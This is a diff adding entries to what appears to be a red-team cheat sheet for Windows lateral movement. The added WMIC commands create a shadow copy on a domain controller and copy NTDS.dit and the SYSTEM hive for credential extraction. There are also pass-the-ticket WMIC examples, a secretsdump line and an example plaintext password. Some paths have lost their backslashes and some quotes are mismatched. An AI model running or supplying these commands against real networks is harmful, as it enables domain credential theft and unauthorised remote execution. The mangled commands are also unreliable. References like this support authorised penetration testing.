@@ -29,10 +29,22 @@ python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee -just-dc acmebank
 ### Windows Management Instrumentation
 
 ```
+wmic /node:DC_hostname / Domain User / password process call create "cmd /c vssadmin create shadow /for=C: 2>&1 > vss.log“
+wmic /node:DC_hostname / Domain User / password process call create "cmd /c copy GLOBALROOT Device HarddiskVolumeShadowCopy1 Windows NTDS NTDS.dit C: windows temp NTDS.dit 2>&1 > c: vss2.log“
+wmic /node:DC_hostname / Domain User / password process call create "cmd /c copy GLOBALROOT Device HarddiskVolumeShadowCopy1 Windows System32 config SYSTEM C: windows temp SYSTEM.hive 2>&1 > c: vss2.log"
+wmic /node:REMOTE /user:DOMAIN USER /password:PASSWORD process call create “ Windows System32 notepad.exe”
+
 wmic /node:"wkstn-4945" /user:"cyberbotic.io\n.lamb" /password:"F3rrari" process call create "powershell -enc [...snip...]"
 WMIGrunt wkstn-4945 PowerShell cyberbotic.io\n.lamb F3rrari
 WMIGrunt wkstn-4945 PowerShell
 
+```
+### Pass the Ticket with WMIC
+```
+wmic /authority:"Kerberos: Domain DC_Hostname“ / DC_hostname process call create 
+wmic /authority:"kerberos:contoso.local\district" /node:district.contoso.local path win32_process call create calc.exe
+wmic /authority:"kerberos:contoso.local\district" /node:district.contoso.local "cmd /c ipconfig"
+wmic /authority:"Kerberos:DOMAIN REMOTE" /node:REMOTE process call create " Windows System32 nodepad.exe"
 ```
   ### PowerShell Remoting
  ```
